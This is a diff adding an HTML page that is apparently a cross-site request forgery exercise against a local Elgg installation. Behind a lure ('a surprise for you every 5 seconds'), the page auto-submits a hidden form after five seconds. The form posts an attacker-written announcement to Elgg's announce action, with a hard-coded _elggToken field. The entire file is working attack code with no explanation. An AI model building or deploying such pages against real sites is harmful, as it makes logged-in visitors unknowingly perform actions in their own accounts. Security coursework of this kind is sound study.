@@ -1,0 +1,21 @@
+<html>
+
+<head>
+</head>
+<body bgcolor="black" onload="setTimeout('document.announceForm.submit();',5000);">
+<center>
+<font color="white"><h1>Welcome to this Web Security Site !!!</h1>
+
+<h2>There is a surprise for you every 5 seconds</h2></font>
+</center>
+<form action="http://localhost/elgg/action/announce/send" method="post"  name="announceForm">
+				<input type="hidden" value="PPPAttacker" id="ann-title" name="ann_title">
+			<input type="hidden" value="PPPPXXX" id="ann-desc" name="ann_desc">
+			
+				<input type="hidden" id="ann-content"  value="You Are Attacked by us" name="ann_content">
+			
+		<input type="hidden" name="_elggToken" value="hhhhhNTFfOjox"></input>
+		
+	</form>	
+</body>
+</html>
